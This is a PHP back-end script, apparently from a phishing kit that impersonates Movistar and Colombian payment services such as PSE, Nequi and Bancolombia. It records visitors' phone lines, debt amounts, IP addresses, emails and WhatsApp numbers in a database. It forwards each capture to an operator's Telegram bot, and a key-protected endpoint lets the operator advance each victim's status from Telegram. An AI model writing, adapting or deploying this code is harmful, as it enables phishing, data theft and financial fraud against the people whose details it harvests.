<?php
include 'db.php';
$config = include 'config.php';

function logDebug($msg) {
    file_put_contents(__DIR__ . '/debug_updatetele.log', date('Y-m-d H:i:s') . " - $msg\n", FILE_APPEND);
}

$security_key = $config['security_key'];

// Helper para enviar a Telegram
function sendTelegram($msg, $cfg) {
    if (!$cfg['botToken'] || !$cfg['chatId']) return;
    $url = "https://api.telegram.org/bot{$cfg['botToken']}/sendMessage";
    $data = [
        'chat_id' => $cfg['chatId'],
        'text' => $msg,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($data),
        ]
    ];
    $context  = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

// --- ACCIÓN: REGISTRAR CONSULTA INICIAL ---
if (isset($_GET['action']) && $_GET['action'] === 'log_consulta') {
    $numero = $_GET['numero'] ?? 'Desconocido';
    $monto = $_GET['monto'] ?? '0';
    $ip = $_SERVER['REMOTE_ADDR'];
    logDebug("log_consulta: Num: $numero, Monto: $monto, IP: $ip");
    
    $sql = "INSERT INTO pse (linea_consultada, ip_address, estado, banco, usuario) VALUES (:num, :ip, 17, 'Consulta', :user)";
    $stmt = $conn->prepare($sql);
    try {
        if ($stmt->execute(['num' => $numero, 'ip' => $ip, 'user' => $numero])) {
            $lastId = $conn->lastInsertId();
            logDebug("Log Consulta EXITOSO. ID: $lastId");
            
            $msg = "<b>🔍 NUEVA CONSULTA (MOVISTAR)</b>\n\n"
                 . "☎️ <b>Línea:</b> <code>$numero</code>\n"
                 . "💰 <b>Deuda:</b> <code>$monto</code>\n"
                 . "🌐 <b>IP:</b> <code>$ip</code>\n"
                 . "🆔 <b>ID:</b> #$lastId";
            sendTelegram($msg, $config);
            
            header('Content-Type: application/json');
            echo json_encode(['status' => 'success', 'id' => $lastId]);
        } else {
            $err = $stmt->errorInfo();
            logDebug("Log Consulta FALLIDO. Error: " . json_encode($err));
            echo json_encode(['status' => 'error']);
        }
    } catch (Exception $e) {
        logDebug("Exception en log_consulta: " . $e->getMessage());
        echo json_encode(['status' => 'error', 'msg' => $e->getMessage()]);
    }
    exit();
}

// --- ACCIÓN: REGISTRAR DATOS DE CONTACTO ---
if (isset($_GET['action']) && $_GET['action'] === 'log_contact') {
    $id = intval($_GET['id']);
    $email = $_GET['email'] ?? '';
    $phone = $_GET['phone'] ?? '';
    
    $sql = "UPDATE pse SET email = :email, tel_contacto = :phone, estado = 18 WHERE id = :id";
    $stmt = $conn->prepare($sql);
    if ($stmt->execute(['email' => $email, 'phone' => $phone, 'id' => $id])) {
        
        $msg = "<b>👤 DATOS DE CONTACTO</b>\n\n"
             . "🆔 <b>ID:</b> #$id\n"
             . "📧 <b>Email:</b> <code>$email</code>\n"
             . "📱 <b>WhatsApp:</b> <code>$phone</code>";
        sendTelegram($msg, $config);
        
        header('Content-Type: application/json');
        echo json_encode(['status' => 'success']);
    } else {
        echo json_encode(['status' => 'error']);
    }
    exit();
}

// --- LÓGICA ORIGINAL DE ACTUALIZACIÓN DE ESTADO (BOTONES) ---
if (isset($_GET['id'], $_GET['estado'], $_GET['key']) && $_GET['key'] === $security_key) {
    $id = intval($_GET['id']);
    $estado = intval($_GET['estado']);

    // Determinar qué tabla actualizar: pse (default) o nequi
    $tablaPermitida = ['pse', 'nequi', 'bancolombia'];
    $tabla = isset($_GET['tabla']) && in_array($_GET['tabla'], $tablaPermitida)
        ? $_GET['tabla']
        : 'pse';

    $sql = "UPDATE $tabla SET estado = :estado WHERE id = :id";
    $stmt = $conn->prepare($sql);

    if ($stmt && $stmt->execute(['estado' => $estado, 'id' => $id])) {
        echo "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Estado Actualizado</title></head>";
        echo "<body style='display:flex;justify-content:center;align-items:center;height:100vh;font-family:Arial,sans-serif;background-color:#f4f4f4;'>";
        echo "<div style='text-align:center;background:#fff;padding:40px;border-radius:10px;box-shadow:0 4px 6px rgba(0,0,0,0.1);'>";
        echo "<h1 style='color:#4CAF50;'>✅ ¡Estado Actualizado!</h1>";
        echo "<p style='color:#333;font-size:18px;'>El estado (#$estado) del registro (#$id) en <b>" . strtoupper($tabla) . "</b> se cambió exitosamente.</p>";
        echo "<p style='color:#777;font-size:14px;margin-top:20px;'>Ya puedes cerrar esta pestaña y volver a Telegram.</p>";
        echo "</div></body></html>";
    } else {
        echo "Error al actualizar el estado.";
    }
    exit();
}

echo "Acceso no autorizado o parámetros inválidos.";
?>